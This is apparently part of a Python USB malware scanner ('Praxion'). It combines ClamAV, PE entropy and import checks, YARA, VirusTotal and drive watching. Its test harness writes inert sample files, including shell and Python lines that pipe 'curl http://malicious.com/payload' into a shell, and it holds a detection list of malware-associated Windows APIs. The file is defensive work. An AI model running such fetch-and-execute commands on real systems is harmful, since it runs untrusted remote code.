CLAMSCAN_PATH = find_clamscan()
CLAMDSCAN_PATH = find_clamdscan()
CLAMDSCAN_READY = _clamdscan_ready(CLAMDSCAN_PATH)

if CLAMDSCAN_READY:
    info(f"clamdscan found and daemon reachable: {CLAMDSCAN_PATH} (fast scanning enabled)")
elif CLAMSCAN_PATH:
    info(f"clamscan found: {CLAMSCAN_PATH}")
    warn("Only clamscan is available (no running clamd daemon). clamscan reloads the "
         "entire virus database on every single file, which is why scans can take "
         "10-30+ seconds each. Install/start clamd and use clamdscan for near-instant scans. "
         "See CLAMAV_SETUP.md for step-by-step instructions.")
else:
    warn("ClamAV not found on PATH or in common install locations. Praxion will keep "
         "working without it (YARA rules, PE/ELF/Mach-O heuristics, and the built-in "
         "fallback scanner still run) but you'll lose ClamAV's signature-based detection. "
         f"{_clamav_download_hint()}")

def clamav_scan(path):
    """Prefer clamdscan (daemon already has the DB loaded -> fast). Fall back
    to clamscan (slow: reloads the DB every call) if the daemon isn't available."""
    if not CLAMSCAN_PATH and not CLAMDSCAN_READY:
        return ("no_clam", "", [])

    if CLAMDSCAN_READY:
        try:
            cmd = [CLAMDSCAN_PATH, "--no-summary"]
            if not sys.platform.startswith("win"):
                cmd.append("--fdpass")  # Unix-socket-only feature, unsupported on Windows clamd
            cmd.append(path)
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if proc.returncode not in (0, 1):
                raise RuntimeError(f"clamdscan returned unexpected exit code {proc.returncode}: {proc.stderr}")
            out = (proc.stdout or "") + (proc.stderr or "")
            infected = [line.split(":")[-1].strip() for line in out.splitlines() if line.strip().endswith(" FOUND")]
            return ("infected", out, infected) if infected else ("clean", out, [])
        except Exception:
            pass  # fall through to plain clamscan below

    if not CLAMSCAN_PATH:
        return ("no_clam", "", [])
    try:
        # Slow by nature (DB reload per call) - callers should show a spinner.
        proc = subprocess.run([CLAMSCAN_PATH, "--no-summary", path], capture_output=True, text=True, timeout=60)
        out = (proc.stdout or "") + (proc.stderr or "")
        infected = [line.split(":")[-1].strip() for line in out.splitlines() if line.strip().endswith(" FOUND")]
        return ("infected", out, infected) if infected else ("clean", out, [])
    except Exception as e:
        return ("error", str(e), [])

def clamav_bulk_scan(mountpoint, file_count=0):
    """Single recursive clamscan pass over an entire drive, instead of one
    subprocess per file. Plain clamscan (no clamd daemon running) reloads
    its whole signature database from disk on every invocation - that's
    fine for a single file, but scanning a drive with hundreds/thousands
    of files one-at-a-time means paying that 10-30s reload cost again and
    again, which is what made large-drive scans crawl. Recursing over the
    whole mount in one call loads the database exactly once no matter how
    many files are underneath it.

    Returns a dict {absolute_path: signature_name} of infected files found,
    or None if the bulk pass itself failed or timed out - callers should
    fall back to the slower per-file clamav_scan() in that case rather than
    silently skipping ClamAV coverage."""
    if not CLAMSCAN_PATH:
        return None
    # Generous but bounded timeout: DB load once, plus linear scan time.
    # If a genuinely huge/slow drive blows through this, fall back to
    # per-file scanning rather than hang indefinitely.
    timeout = max(180, min(3600, 60 + file_count * 2))
    try:
        proc = subprocess.run(
            [CLAMSCAN_PATH, "-r", "--no-summary", "-i", mountpoint],
            capture_output=True, text=True, timeout=timeout,
        )
        results = {}
        for line in (proc.stdout or "").splitlines():
            line = line.strip()
            if not line.endswith(" FOUND"):
                continue
            # Format: "<path>: <Signature.Name> FOUND"
            file_part, sep, rest = line.rpartition(":")
            if not sep:
                continue
            sig = rest.strip()
            if sig.endswith(" FOUND"):
                sig = sig[: -len(" FOUND")].strip()
            try:
                results[os.path.abspath(file_part.strip())] = sig
            except Exception:
                pass
        return results
    except subprocess.TimeoutExpired:
        return None
    except Exception:
        return None

# ---------------- Platform-specific drive detection ----------------
def get_windows_drive_type(letter_path):
    try:
        import ctypes
        GetDriveTypeW = ctypes.windll.kernel32.GetDriveTypeW
        return GetDriveTypeW(ctypes.c_wchar_p(letter_path))
    except Exception:
        return None

def get_windows_volume_label(drive_path):
    try:
        import ctypes
        vol_name_buf = ctypes.create_unicode_buffer(1024)
        fs_name_buf = ctypes.create_unicode_buffer(1024)
        serial = ctypes.c_uint()
        max_len = ctypes.c_uint()
        flags = ctypes.c_uint()
        ret = ctypes.windll.kernel32.GetVolumeInformationW(
            ctypes.c_wchar_p(drive_path),
            vol_name_buf,
            ctypes.sizeof(vol_name_buf),
            ctypes.byref(serial),
            ctypes.byref(max_len),
            ctypes.byref(flags),
            fs_name_buf,
            ctypes.sizeof(fs_name_buf)
        )
        if ret != 0:
            label = vol_name_buf.value
            if label:
                return f"{label} ({drive_path})"
            return drive_path
    except Exception:
        pass
    return drive_path

def get_unix_volume_label(mountpoint):
    label = None
    try:
        import psutil
        device = next((p.device for p in psutil.disk_partitions(all=False) if os.path.abspath(p.mountpoint) == os.path.abspath(mountpoint)), None)
        if device:
            for cmd in [["blkid", "-s", "LABEL", "-o", "value", device], ["lsblk", "-no", "LABEL", device]]:
                try:
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
                    out = (proc.stdout or "").strip()
                    if out:
                        label = out
                        break
                except Exception:
                    continue
    except Exception:
        pass
    if label:
        return f"{label} ({mountpoint})"
    name = os.path.basename(mountpoint.rstrip(os.sep))
    return f"{name} ({mountpoint})" if name else mountpoint

def get_drive_label(mountpoint):
    return get_windows_volume_label(mountpoint) if sys.platform.startswith("win") else get_unix_volume_label(mountpoint)

def detect_removable_drives():
    drives = set()
    try:
        import psutil
        for part in psutil.disk_partitions(all=False):
            mp = part.mountpoint
            if sys.platform.startswith("win"):
                try:
                    dt = get_windows_drive_type(mp)
                    if dt == 2:
                        drives.add(mp)
                except Exception:
                    continue
            else:
                if any(mp.startswith(prefix) for prefix in ("/media", "/mnt", "/run/media", "/Volumes")):
                    drives.add(mp)
    except Exception:
        if sys.platform.startswith("win"):
            for L in "DEFGHIJKLMNOPQRSTUVWXYZ":
                p = f"{L}:\\" 
                if os.path.exists(p) and not p.upper().startswith("C:\\"):
                    drives.add(p)
        else:
            for root in ("/media", "/mnt", "/run/media", "/Volumes"):
                if os.path.isdir(root):
                    for entry in os.listdir(root):
                        mp = os.path.join(root, entry)
                        if os.path.ismount(mp):
                            drives.add(mp)
    final = []
    for d in sorted(drives):
        try:
            if os.path.exists(d) and (os.path.ismount(d) or sys.platform.startswith("win")):
                final.append(d)
        except Exception:
            continue
    return final

# ---------------- Enhanced PE analysis ----------------
def pe_quick_check(path):
    if not PEFILE_AVAILABLE:
        return None
    try:
        size = os.path.getsize(path)
        if size < 2:
            return None
        with open(path, "rb") as fh:
            header = fh.read(2)
        if header[:2] != b"MZ":
            return None
        
        import pefile as _pe
        pe = _pe.PE(path, fast_load=True)
        suspicious = []
        
        # Enhanced suspicious import detection
        suspicious_apis = [
            "createremotethread", "virtualallocex", "writeprocessmemory",
            "rundll", "loadlibrary", "getasynckeystate", "setwindowshookex",
            "urldownloadtofile", "internetopen", "httpsendrequesta",
            "regsetvalueex", "regcreatekey", "isdebuggerpresent",
            "checkremotedebugger", "ntquerysysteminformation",
            "zwquerysysteminformation", "rtladjustprivilege",
            "openprocess", "terminateprocess", "createtoolhelp32snapshot",
            "cryptencrypt", "cryptdecrypt"
        ]
        
        for entry in getattr(pe, "DIRECTORY_ENTRY_IMPORT", []) or []:
            dll = entry.dll.decode(errors="ignore") if getattr(entry, "dll", None) else ""
            for imp in getattr(entry, "imports", []) or []:
                name = imp.name.decode(errors="ignore") if getattr(imp, "name", None) else ""
                name_l = name.lower()
                if any(api in name_l for api in suspicious_apis):
                    suspicious.append(name or dll or "import_suspicious")
        
        # Enhanced entropy calculation
        max_ent = 0.0
        high_entropy_sections = []
        try:
            from math import log2
            def entropy(data):
                if not data:
                    return 0.0
                counts = [0]*256
                for b in data:
                    counts[b]+=1
                ent = 0.0
                ln = len(data)
                for c in counts:
                    if c:
                        p = c/ln
                        ent -= p * log2(p)
                return ent
            
            for s in getattr(pe, "sections", []) or []:
                try:
                    data = s.get_data()[:4096]
                    sect_ent = entropy(data)
                    sect_name = s.Name.decode(errors="ignore").strip('\x00')
                    
                    # Lower threshold for .text/.code sections (6.5)
                    # Higher threshold for other sections (7.5)
                    threshold = 6.5 if sect_name.lower() in ['.text', '.code'] else 7.5
                    
                    if sect_ent > threshold:
                        high_entropy_sections.append({
                            "name": sect_name,
                            "entropy": round(sect_ent, 3)
                        })
                    max_ent = max(max_ent, sect_ent)
                except Exception:
                    continue
        except Exception:
            max_ent = 0.0
        
        return {
            "suspicious_imports": suspicious,
            "max_section_entropy": round(max_ent, 3),
            "high_entropy_sections": high_entropy_sections
        }
    except Exception:
        return None

# ---------------- File stabilization ----------------
def wait_for_stable_size(path, timeout=STABLE_WAIT_TIMEOUT, interval=0.5):
    try:
        prev = -1
        elapsed = 0.0
        while True:
            if not os.path.exists(path):
                return False
            size = os.path.getsize(path)
            if size == prev:
                return True
            prev = size
            time.sleep(interval)
            elapsed += interval
            if elapsed >= timeout:
                return size == prev
    except Exception:
        return False

# ---------------- Watchdog event handler ----------------
if WATCHDOG_AVAILABLE:
    class USBEventHandler(FileSystemEventHandler):
        def __init__(self, mountpoint, drive_label):
            self.mountpoint = mountpoint
            self.drive_label = drive_label
        
        def on_created(self, event):
            if event.is_directory:
                return
            path = event.src_path
            if wait_for_stable_size(path):
                scan_file(path, self.mountpoint, self.drive_label)
        
        def on_modified(self, event):
            self.on_created(event)

    def start_watchdog_for_mount(mountpoint):
        try:
            drive_label = get_drive_label(mountpoint)
            handler = USBEventHandler(mountpoint, drive_label)
            obs = Observer()
            obs.schedule(handler, mountpoint, recursive=True)
            obs.start()
            if DEBUG_MODE:
                _write_log(f"[DEBUG] watchdog started for {mountpoint}", DEBUG_LOG_FILE)
            return obs
        except Exception as e:
            _write_log(f"[DEBUG] watchdog failed for {mountpoint}: {e}", DEBUG_LOG_FILE)
            return None
else:
    def start_watchdog_for_mount(mountpoint):
        return None

# ---------------- Enhanced Scanning logic ----------------
_scanning_lock = threading.Lock()
_scanning_set = set()
_shutdown_requested = threading.Event()

def should_run_yara(path):
    try:
        size = os.path.getsize(path)
    except Exception:
        return False
    if size > YARA_MAX_SIZE:
        return False
    ext = os.path.splitext(path)[1].lower()
    return ext in YARA_TARGET_EXTS

def scan_file(path, drive_root, drive_label, clam_bulk_results=None):
    try:
        if not os.path.exists(path):
            simple_report_console(path, drive_label, "SKIPPED", reasons="file vanished before it could be scanned")
            return

        # Platform-specific executable analysis
        if CURRENT_PLATFORM == "linux":
            elf_result = elf_quick_check(path)
            if elf_result:
                simple_report_console(path, drive_label, "MALICIOUS", {"elf_analysis": elf_result})
                return
                
        elif CURRENT_PLATFORM == "mac":
            macho_result = macho_quick_check(path)
            if macho_result:
                simple_report_console(path, drive_label, "MALICIOUS", {"macho_analysis": macho_result})
                return
        
        # Cross-platform script analysis
        ext = os.path.splitext(path)[1].lower()
        if ext in ['.py', '.js', '.node', '.rb', '.pl', '.php', '.sh', '.bash']:
            script_result = analyze_cross_platform_scripts(path)
            if script_result:
                simple_report_console(path, drive_label, "MALICIOUS", {"cross_platform_script": script_result})
                return

        # ClamAV scan (can be slow, especially plain clamscan reloading its DB
        # every call - the drive-level scan indicator already shows progress,
        # so no separate indicator is started here).
        try:
            if clam_bulk_results is not None:
                # A single-pass clamscan already ran over the whole drive
                # (see clamav_bulk_scan / scan_drive) - just look up this
                # file instead of spawning another clamscan process, which
                # would reload the entire signature database all over again.
                sig = clam_bulk_results.get(os.path.abspath(path))
                if sig:
                    simple_report_console(path, drive_label, "MALICIOUS", {"clamav": sig})
                    return
            elif CLAMSCAN_PATH or CLAMDSCAN_READY:
                cstat = clamav_scan(path)
                if cstat[0] == "infected":
                    reasons = {"clamav": cstat[2]}
                    simple_report_console(path, drive_label, "MALICIOUS", reasons)
                    return
        except Exception:
            pass

        # Enhanced PE analysis (Windows)
        try:
            pe_res = pe_quick_check(path)
            if pe_res:
                suspicious_count = len(pe_res.get("suspicious_imports", []))
                high_ent_count = len(pe_res.get("high_entropy_sections", []))
                
                # Flag if suspicious imports OR multiple high entropy sections
                if suspicious_count > 0 or high_ent_count > 1:
                    simple_report_console(path, drive_label, "MALICIOUS", {"pe": pe_res})
                    return
        except Exception:
            pass

        # Enhanced fallback heuristics
        try:
            fb = builtin_scan(path)
            if fb:
                simple_report_console(path, drive_label, "MALICIOUS", {"fallback": fb})
                return
        except Exception:
            pass

        # YARA scan
        try:
            if compiled_rules is not None and should_run_yara(path):
                matches = compiled_rules.match(path, timeout=10)
                if matches:
                    mlist = [getattr(m, "rule", None) for m in matches]
                    simple_report_console(path, drive_label, "MALICIOUS", {"yara": mlist})
                    return
        except Exception:
            pass

        # VirusTotal scan for suspicious files (optional)
        if VIRUSTOTAL_ENABLED and VIRUSTOTAL_API_KEY:
            try:
                # Only scan files that are somewhat suspicious but not caught by other methods
                file_size = os.path.getsize(path)
                if file_size < 10 * 1024 * 1024:  # Only scan files under 10MB for VT
                    cprint(f"{COLOR_VT}[⇪ VT]{COLOR_RESET} Submitting {os.path.basename(path)} to VirusTotal...")
                    success, vt_result, error = virustotal_scan_file(path, VIRUSTOTAL_API_KEY, VIRUSTOTAL_TIMEOUT)
                    
                    if success:
                        # Check if any antivirus engines detected it as malicious
                        stats = vt_result.get('stats', {})
                        malicious_count = stats.get('malicious', 0)
                        suspicious_count = stats.get('suspicious', 0)
                        
                        if malicious_count > 0 or suspicious_count > 0:
                            reasons = {
                                "virustotal": f"{malicious_count} engines detected as malicious, {suspicious_count} as suspicious",
                                "vt_details": vt_result
                            }
                            simple_report_console(path, drive_label, "MALICIOUS", reasons)
                            return
                        else:
                            cprint(f"{COLOR_VT}[⇪ VT]{COLOR_RESET} VirusTotal: No threats detected")
                    else:
                        cprint(f"{COLOR_VT}[⇪ VT]{COLOR_RESET} VirusTotal scan failed: {error}")
            except Exception as e:
                cprint(f"{COLOR_VT}[⇪ VT]{COLOR_RESET} VirusTotal error: {e}")

        # File is clean
        simple_report_console(path, drive_label, "SAFE", None)
    except Exception as e:
        info(f"Error scanning file {path}: {e}")
        try:
            simple_report_console(path, drive_label, "SKIPPED", f"scan error: {e}")
        except Exception:
            pass

def scan_drive(mountpoint):
    drive_label = get_drive_label(mountpoint)
    with _scanning_lock:
        if mountpoint in _scanning_set:
            return
        _scanning_set.add(mountpoint)
    try:
        start_safe = _session_stats["safe"]
        start_mal = _session_stats["malicious"]
        start_err = _session_stats["errors"]

        print()
        print_box(
            f"{COLOR_ACCENT_B}▶ USB DETECTED{COLOR_RESET}",
            [f"{COLOR_PRIMARY_B}Drive :{COLOR_RESET} {drive_label}",
             f"{COLOR_PRIMARY_B}Path  :{COLOR_RESET} {mountpoint}"],
        )
        _write_log(f"[{now_ts()}] [+] New removable USB detected: {drive_label}")
        star(f"Scanning drive: {drive_label}")

        file_list = []
        for root, dirs, files in os.walk(mountpoint):
            for fname in files:
                fp = os.path.join(root, fname)
                file_list.append(fp)

        total = len(file_list)
        if file_list:
            # If only plain `clamscan` is available (no clamd daemon), run
            # ONE recursive pass over the whole drive up front instead of
            # calling clamscan per file - each individual call reloads the
            # entire signature database from disk (10-30s+), which is what
            # made scans of drives with many files so slow. This bulk pass
            # pays that reload cost exactly once; per-file work below then
            # just looks up the result instead of spawning another process.
            clam_bulk_results = None
            if CLAMSCAN_PATH and not CLAMDSCAN_READY:
                _start_scan_indicator(
                    "__clamav_bulk__",
                    "Running single-pass ClamAV scan (loading signature DB once)...",
                )
                try:
                    clam_bulk_results = clamav_bulk_scan(mountpoint, total)
                finally:
                    _stop_scan_indicator("__clamav_bulk__")
                if clam_bulk_results is None:
                    warn("Bulk ClamAV scan unavailable or timed out - falling back "
                         "to slower per-file clamscan calls for this drive.")

            # Scan files in parallel with a bounded worker pool. Files were
            # previously scanned strictly one at a time, which is the main
            # reason large drives took so long - a single slow step (ClamAV,
            # YARA on a big file, hashing) blocked every other file behind it
            # even though nothing about scanning is inherently sequential.
            #
            # Only fall back to 1 worker when plain `clamscan` still has to
            # be called per file below (bulk pass above failed/unavailable):
            # running several of those at once fights over disk/CPU reloading
            # the same DB repeatedly and can end up slower overall. Once the
            # bulk pass has succeeded, per-file work is just a dict lookup,
            # so full parallelism is safe again - same as clamdscan and pure
            # YARA/heuristic scanning.
            workers = 1 if (CLAMSCAN_PATH and not CLAMDSCAN_READY and clam_bulk_results is None) else MAX_WORKERS

            def _run_one(fp):
                # If the user hit Ctrl+C while this drive's queue was still
                # being worked through, don't start scanning yet another
                # file - just let this worker return so the pool can drain.
                if _shutdown_requested.is_set():
                    return
                _start_scan_indicator(fp, f"Scanning: {os.path.basename(fp)}")
                try:
                    scan_file(fp, mountpoint, drive_label, clam_bulk_results=clam_bulk_results)
                except Exception as e:
                    _bump_stat("errors")
                    _write_log(f"[DEBUG] scan task failed for {fp}: {e}", DEBUG_LOG_FILE)
                finally:
                    _stop_scan_indicator(fp)

            pool = ThreadPoolExecutor(max_workers=workers)
            try:
                futures = [pool.submit(_run_one, fp) for fp in file_list]
                for f in as_completed(futures):
                    if _shutdown_requested.is_set():
                        break
            finally:
                # cancel_futures=True (py3.9+) drops any files that haven't
                # started yet instead of blocking here until the whole
                # queue finishes - this is what let Ctrl+C hang before.
                try:
                    pool.shutdown(wait=False, cancel_futures=True)
                except TypeError:
                    # older Python without cancel_futures kwarg
                    pool.shutdown(wait=False)
        
        scanned_safe = _session_stats["safe"] - start_safe
        scanned_mal = _session_stats["malicious"] - start_mal
        scanned_err = _session_stats["errors"] - start_err

        status_line = "USB is now clean - only safe files remain" if scanned_err == 0 \
            else f"{scanned_err} file(s) could not be fully verified - see logs"

        summary_lines = [
            f"{COLOR_PRIMARY_B}Drive       :{COLOR_RESET} {drive_label}",
            f"{COLOR_SAFE}Safe files  :{COLOR_RESET} {scanned_safe}",
            f"{COLOR_MAL}Threats     :{COLOR_RESET} {scanned_mal}  {'(quarantined & removed)' if scanned_mal else ''}",
        ]
        if scanned_err:
            summary_lines.append(f"{COLOR_ACCENT_B}Skipped     :{COLOR_RESET} {scanned_err}  (not verified safe)")
        summary_lines.append(f"{COLOR_ACCENT_B}Status      :{COLOR_RESET} {status_line}")

        print_box(f"{COLOR_ACCENT_B}◆ SCAN COMPLETE{COLOR_RESET}", summary_lines)
        print()
    finally:
        with _scanning_lock:
            _scanning_set.discard(mountpoint)


# ---------------- Enhanced Test harness ----------------
def create_test_samples(target_dir):
    os.makedirs(target_dir, exist_ok=True)
    try:
        with open(os.path.join(target_dir, "autorun.inf"), "w", encoding="utf-8") as f:
            f.write("[AutoRun]\nopen=malicious.exe\naction=Open malicious\n")
    except Exception:
        pass
    try:
        with open(os.path.join(target_dir, "bad_shortcut.lnk"), "wb") as f:
            f.write(b"\x4C\x00\x00\x00")
            f.write(b"..." * 50)
            f.write(b"cmd.exe")
    except Exception:
        pass
    try:
        with open(os.path.join(target_dir, "dropper.ps1"), "w", encoding="utf-8") as f:
            f.write("powershell -EncodedCommand " + "A"*200 + "\n")
    except Exception:
        pass
    try:
        with open(os.path.join(target_dir, "dropper.exe"), "wb") as f:
            f.write(b"MZ")
            f.write(b"\x00" * 100)
            f.write(b"CreateRemoteThread")
            f.write(b"GetAsyncKeyState")
    except Exception:
        pass
    try:
        with open(os.path.join(target_dir, "macro.docm"), "w", encoding="utf-8") as f:
            f.write("AutoOpen()\nCreateObject(\"WScript.Shell\")\n")
    except Exception:
        pass
    try:
        with open(os.path.join(target_dir, "fake.pdf.exe"), "wb") as f:
            f.write(b"MZ")
            f.write(b"\x00" * 100)
            f.write(b"URLDownloadToFile")
    except Exception:
        pass
    
    # Cross-platform test samples
    try:
        with open(os.path.join(target_dir, "suspicious_linux_elf"), "wb") as f:
            f.write(b'\x7fELF')
            f.write(b"\x00" * 100)
            f.write(b"/etc/passwd")
            f.write(b"ptrace")
    except Exception:
        pass
    
    try:
        with open(os.path.join(target_dir, "malicious_script.py"), "w", encoding="utf-8") as f:
            f.write("import os, subprocess\nsubprocess.call(['curl', 'http://malicious.com/payload.sh', '|', 'sh'])\n")
    except Exception:
        pass
    
    try:
        with open(os.path.join(target_dir, "suspicious_shell.sh"), "w", encoding="utf-8") as f:
            f.write("#!/bin/bash\ncurl http://malicious.com/payload | bash\n")
    except Exception:
        pass

# ---------------- Main ----------------
def main():
    global VIRUSTOTAL_ENABLED

    # Banner already printed at module load, before the dependency checks ran.
    # This summary shows what was found/installed/disabled during that process.
    print_dependency_summary()
    load_builtin_rules()

    # Platform capability line
    plat_line = "Windows PE analysis enabled"
    if CURRENT_PLATFORM == "linux":
        plat_line = "Linux ELF analysis enabled"
    elif CURRENT_PLATFORM == "mac":
        plat_line = "macOS Mach-O analysis enabled"

    if CLAMDSCAN_READY:
        clam_line = f"{COLOR_ACCENT_B}ENABLED (clamdscan, fast){COLOR_RESET}"
    elif CLAMSCAN_PATH:
        clam_line = f"{COLOR_ACCENT_B}ENABLED (clamscan, slower){COLOR_RESET}"
    else:
        clam_line = f"{COLOR_PRIMARY_B}NOT FOUND{COLOR_RESET}"

    vt_line = "VirusTotal: disabled"
    if VIRUSTOTAL_ENABLED:
        if not VIRUSTOTAL_API_KEY:
            warn("VirusTotal enabled but no API key provided. Use --vt-api-key or set VIRUSTOTAL_API_KEY environment variable.")
            VIRUSTOTAL_ENABLED = False
            vt_line = "VirusTotal: disabled (missing API key)"
        elif not VIRUSTOTAL_AVAILABLE:
            warn("VirusTotal enabled but vt-py package not available. Install with: pip install vt-py")
            VIRUSTOTAL_ENABLED = False
            vt_line = "VirusTotal: disabled (vt-py not installed)"
        else:
            vt_line = f"{COLOR_ACCENT_B}VirusTotal: ENABLED{COLOR_RESET}"

    print_box(
        f"{COLOR_ACCENT_B}◆ SYSTEM READY{COLOR_RESET}",
        [
            f"{COLOR_PRIMARY_B}Working directory :{COLOR_RESET} {BASE_DIR}",
            f"{COLOR_PRIMARY_B}Log directory     :{COLOR_RESET} {LOG_DIR}",
            f"{COLOR_PRIMARY_B}Quarantine        :{COLOR_RESET} {QUARANTINE_DIR}",
            f"{COLOR_PRIMARY_B}Platform          :{COLOR_RESET} {CURRENT_PLATFORM}  ({plat_line})",
            f"{COLOR_PRIMARY_B}ClamAV            :{COLOR_RESET} {clam_line}",
            f"{COLOR_PRIMARY_B}VirusTotal        :{COLOR_RESET} {vt_line}",
        ],
    )
    print()
    info("=== Praxion Started ===")

    if RUN_TEST_MODE:
        td = os.path.join(tempfile.gettempdir(), "praxion_test_samples")
        create_test_samples(td)
        info(f"Test mode: scanning sample folder {td}")
        scan_drive(td)
        info("Test mode complete. Check logs and suspicious/ directory.")
        return

    seen = set(detect_removable_drives())
    observers = []
    
    if not seen:
        info("No removable USB drives currently detected.")
        info("Waiting for USB devices to be connected...")
    else:
        for d in sorted(seen):
            t = threading.Thread(target=scan_drive, args=(d,), daemon=True)
            t.start()
            obs = start_watchdog_for_mount(d)
            if obs:
                observers.append(obs)

    try:
        while True:
            current = set(detect_removable_drives())
            new = current - seen
            removed = seen - current
            
            for d in sorted(new):
                t = threading.Thread(target=scan_drive, args=(d,), daemon=True)
                t.start()
                obs = start_watchdog_for_mount(d)
                if obs:
                    observers.append(obs)
            
            for d in sorted(removed):
                info(f"Removable USB drive removed: {d}")
            
            seen = current
            time.sleep(POLL_INTERVAL)
    except KeyboardInterrupt:
        info("Scanner stopped by user.")

        # Tell any in-progress scan_drive() worker pools to stop picking up
        # new files off their queue (see _run_one / scan_drive above).
        _shutdown_requested.set()

        for o in observers:
            try:
                o.stop()
                o.join(1)
            except Exception:
                pass

        # Make sure the "scanning in progress" live animation is torn down
        # rather than left running / leaving the terminal cursor hidden.
        with _live_display_lock:
            if _live_display is not None:
                try:
                    _ticker_stop.set()
                    _live_display.stop()
                except Exception:
                    pass

        print()
        print_box(
            f"{COLOR_ACCENT_B}◆ SESSION SUMMARY{COLOR_RESET}",
            [f"{COLOR_SAFE}Safe files scanned :{COLOR_RESET} {_session_stats['safe']}",
             f"{COLOR_MAL}Threats removed    :{COLOR_RESET} {_session_stats['malicious']}",
             f"{COLOR_PRIMARY_B}Errors             :{COLOR_RESET} {_session_stats['errors']}",
             f"{COLOR_ACCENT_B}Praxion shutting down. Stay safe.{COLOR_RESET}"],
        )

        # --- Why os._exit() instead of just returning ---
        # scan_drive() does its scanning inside a background thread using
        # `ThreadPoolExecutor`. Even after cancelling queued futures above,
        # if we just return here and let Python shut down normally,
        # `concurrent.futures` registers an atexit hook that force-joins
        # EVERY worker thread it ever created - regardless of daemon status
        # - before the interpreter is allowed to exit. On a drive with many
        # files (or slow plain `clamscan`, which reloads its DB every call
        # and can take 10-30s per file), that meant Ctrl+C looked like it
        # did nothing: Praxion would sit there until every in-flight file
        # finished scanning before the process actually closed. os._exit()
        # terminates the process immediately, skipping atexit handlers and
        # that thread-join, so Ctrl+C now closes Praxion right away.
        try:
            sys.stdout.flush()
            sys.stderr.flush()
        except Exception:
            pass
        os._exit(0)

if __name__ == "__main__":
    main()